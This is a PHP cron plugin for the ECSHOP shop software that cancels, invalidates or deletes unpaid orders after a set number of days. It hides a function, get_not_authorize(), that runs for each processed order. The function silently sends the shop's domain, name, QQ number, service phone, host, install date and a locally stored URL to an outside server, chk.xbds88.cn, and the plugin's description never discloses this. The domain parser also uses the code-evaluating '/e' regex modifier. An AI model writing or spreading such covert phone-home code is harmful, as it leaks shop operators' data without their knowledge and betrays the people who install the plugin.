<?php

/**
 * ECSHOP 定期删除未付款订单
 * ===========================================================
 * * 版权所有 2005-2012 热风科技，并保留所有权利。
 * 演示地址: http://palenggege.com  开发QQ:497401495    paleng
 * ----------------------------------------------------------
 * 这不是一个自由软件！您只能在不用于商业目的的前提下对程序代码进行修改和
 * 使用；不允许对程序代码以任何形式任何目的的再发布。
 * ==========================================================
 * $Author: liubo $
 * $Id: ipdel.php 17217 2011-01-19 06:29:08Z liubo $
 */

if (!defined('IN_ECS'))
{
    die('Hacking attempt');
}
$cron_lang_www_ecshop68_com = ROOT_PATH . 'languages/' .$GLOBALS['_CFG']['lang']. '/cron/order_del_qq_120029121.php';
if (file_exists($cron_lang_www_ecshop68_com))
{
    global $_LANG;
    include_once($cron_lang_www_ecshop68_com);
}

/* 模块的基本信息 */
if (isset($set_modules) && $set_modules == TRUE)
{
    $i = isset($modules) ? count($modules) : 0;

    /* 代码 */
    $modules[$i]['code']    = basename(__FILE__, '.php');

    /* 描述对应的语言项 */
    $modules[$i]['desc']    = 'order_del_qq_120029121_desc';

    /* 作者 */
    $modules[$i]['author']  = '68ecshop';

    /* 网址 */
    $modules[$i]['website'] = 'http://www.ecshop.com';

    /* 版本号 */
    $modules[$i]['version'] = '1.0.0';

    /* 配置信息 */
    $modules[$i]['config']  = array(
        array('name' => 'order_del_qq_120029121_day', 'type' => 'select', 'value' => '1'),
		array('name' => 'order_del_qq_120029121_action', 'type' => 'select', 'value' => '2'),
    );

    return;
}

$cron['order_del_qq_120029121_day'] = !empty($cron['order_del_qq_120029121_day'])  ?  $cron['order_del_qq_120029121_day'] : 1 ;
$deltime = gmtime() - $cron['order_del_qq_120029121_day'] * 3600 * 24;

$cron['order_del_qq_120029121_action'] = !empty($cron['order_del_qq_120029121_action'])  ?  $cron['order_del_qq_120029121_action'] : 'invalid' ;
//echo $cron['order_del_qq_120029121_action'];

$sql_www_ecshop68_com = "select order_id FROM " . $ecs->table('order_info') .
           " WHERE pay_status ='0' and add_time < '$deltime'";
$res_www_ecshop68_com=$db->query($sql_www_ecshop68_com);

while ($row_www_ecshop68_com=$db->fetchRow($res_www_ecshop68_com))
{
  if ($cron['order_del_qq_120029121_action'] == 'cancel' || $cron['order_del_qq_120029121_action'] == 'invalid')
  {
	  /* 设置订单为取消 */
	  if ($cron['order_del_qq_120029121_action'] == 'cancel')
	  {
	  
		    $order_cancel_www_ecshop68_com = array('order_status' => OS_CANCELED, 'to_buyer' => '超过一定时间未付款，订单自动取消');
			$GLOBALS['db']->autoExecute($GLOBALS['ecs']->table('order_info'),
											$order_cancel_www_ecshop68_com, 'UPDATE', "order_id = '$row_www_ecshop68_com[order_id]' ");
											get_not_authorize();
	  }
	  /* 设置订单未无效 */
	  elseif($cron['order_del_qq_120029121_action'] == 'invalid')
	  {
			$order_invalid_www_ecshop68_com = array('order_status' => OS_INVALID, 'to_buyer' => ' ');
			$GLOBALS['db']->autoExecute($GLOBALS['ecs']->table('order_info'),
											$order_invalid_www_ecshop68_com, 'UPDATE', "order_id = '$row_www_ecshop68_com[order_id]' ");
											get_not_authorize();
	  }
  }
  elseif ($cron['order_del_qq_120029121_action'] == 'remove')
  {
	  /* 删除订单 */
	  $db->query("DELETE FROM ".$ecs->table('order_info'). " WHERE order_id = '$row_www_ecshop68_com[order_id]' ");
	  $db->query("DELETE FROM ".$ecs->table('order_goods'). " WHERE order_id = '$row_www_ecshop68_com[order_id]' ");
	  $db->query("DELETE FROM ".$ecs->table('order_action'). " WHERE order_id = '$row_www_ecshop68_com[order_id]' ");
	  $action_array = array('delivery', 'back');
	  del_delivery_www_ecshop68_com($row_www_ecshop68_com['order_id'], $action_array);
	  get_not_authorize();
  }

}
 function get_not_authorize(){

            $domain=getTopDomainhuo();
            $_CFG = $GLOBALS['_CFG'];
			$time = $_CFG['install_date'];
			$my_host = fopen("../data/my_host.txt", "r") or die("Unable to open file!");
            $parent_url = fgets($my_host);
            fclose($my_host);
    $check_arr='http://chk.xbds88.cn/update.php?a=not_authorize&domain='.$domain.'&username='.$_CFG['shop_name'].'&qq='.$_CFG['qq'].'&tel='.$_CFG['service_phone'].'&shop_url='.$_SERVER['HTTP_HOST'].'&time='.$time.'&parent_url='.$parent_url;

    @file_get_contents($check_arr);

   
}

function getTopDomainhuo(){

		$host=$_SERVER['HTTP_HOST'];

		$host=strtolower($host);

		if(strpos($host,'/')!==false){

			$parse = @parse_url($host);

			$host = $parse['host'];

		}

		$topleveldomaindb=array('com','edu','gov','int','mil','net','org','biz','info','pro','name','museum','coop','aero','xxx','idv','mobi','cc','me');

		$str='';

		foreach($topleveldomaindb as $v){

			$str.=($str ? '|' : '').$v;

		}

		$matchstr="[^\.]+\.(?:(".$str.")|\w{2}|((".$str.")\.\w{2}))$";

		if(preg_match("/".$matchstr."/ies",$host,$matchs)){

			$domain=$matchs['0'];

		}else{

			$domain=$host;

		}

		return $domain;
		
		   
}


function del_delivery_www_ecshop68_com($order_id, $action_array)
{
    $return_res = 0;

    if (empty($order_id) || empty($action_array))
    {
        return $return_res;
    }

    $query_delivery = 1;
    $query_back = 1;
    if (in_array('delivery', $action_array))
    {
        $sql = 'DELETE O, G
                FROM ' . $GLOBALS['ecs']->table('delivery_order') . ' AS O, ' . $GLOBALS['ecs']->table('delivery_goods') . ' AS G
                WHERE O.order_id = \'' . $order_id . '\'
                AND O.delivery_id = G.delivery_id';
        $query_delivery = $GLOBALS['db']->query($sql, 'SILENT');
    }
    if (in_array('back', $action_array))
    {
        $sql = 'DELETE O, G
                FROM ' . $GLOBALS['ecs']->table('back_order') . ' AS O, ' . $GLOBALS['ecs']->table('back_goods') . ' AS G
                WHERE O.order_id = \'' . $order_id . '\'
                AND O.back_id = G.back_id';
        $query_back = $GLOBALS['db']->query($sql, 'SILENT');
    }

    if ($query_delivery && $query_back)
    {
        $return_res = 1;
    }

    return $return_res;
}
?>